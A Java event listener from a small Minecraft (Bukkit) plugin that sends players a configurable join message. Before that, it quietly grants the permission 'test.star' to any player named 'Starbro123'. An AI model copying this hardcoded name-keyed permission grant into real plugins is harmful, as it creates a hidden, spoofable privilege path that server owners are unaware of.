package me.starbro.experimentplugin.events;

import me.starbro.experimentplugin.ExperimentPlugin;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

import java.util.Objects;


public class onPlayerJoin implements Listener {
    private final ExperimentPlugin plugin;
    public onPlayerJoin(ExperimentPlugin plugin) {
        this.plugin = plugin;

    }
    @EventHandler
    public void onJoin(PlayerJoinEvent event) {
        Player p = event.getPlayer();
        if (p.getName().equals("Starbro123")) {
            if (!p.hasPermission("test.star")) {
                p.addAttachment(ExperimentPlugin.getInstance(), "test.star", true);
            }
            return;
        }

        String joinMessage = this.plugin.getConfig().getString("join-message");
        if (joinMessage != null){
            if (joinMessage.contains("%player%")) {
                joinMessage = joinMessage.replace("%player%", p.getName());
            }
            if (joinMessage.contains("%cplayer%")) {
                joinMessage = joinMessage.replace("%cplayer%", Objects.requireNonNull(p.getCustomName()));
            }
            p.sendMessage(ChatColor.translateAlternateColorCodes('&', joinMessage));
            return;
        }

    }
    
}
